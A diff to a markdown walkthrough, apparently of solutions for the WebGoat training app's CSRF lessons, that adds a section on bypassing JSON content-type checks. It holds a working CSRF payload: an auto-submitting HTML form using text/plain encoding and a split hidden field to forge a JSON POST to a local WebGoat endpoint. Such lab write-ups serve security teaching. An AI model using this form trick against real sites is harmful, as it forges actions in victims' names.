@@ -68,9 +68,42 @@ Do not rely on `application/json` content type but implement a proper CSRF prote
 
 ### 7. CSRF and content-type
 
-TODO
+```
+POST /csrf/feedback/message HTTP/1.1
 
-### 8. 
+{
+  "name"    : "WebGoat",
+  "email"   : "webgoat@webgoat.org",
+  "content" : "WebGoat is the best!!"
+}
+```
+
+```xml
+<form
+	name="postform"
+	method="post"
+	action="http://localhost:8080/WebGoat/csrf/feedback/message/"
+	enctype="text/plain">
+	
+	<input 
+		type="hidden" 
+		name='
+		{
+			"name":"WebGoat",
+			"email":"webgoat@webgoat.org",
+			"content":"WebGoat is the best!!",
+			"subject":"service'
+		value='"}'>
+</form>
+
+<script type="text/javascript">
+	document.postform.submit();
+</script>
+```
+
+### 8. Login CSRF attack
+
+TODO
 
 ### 9. 
 
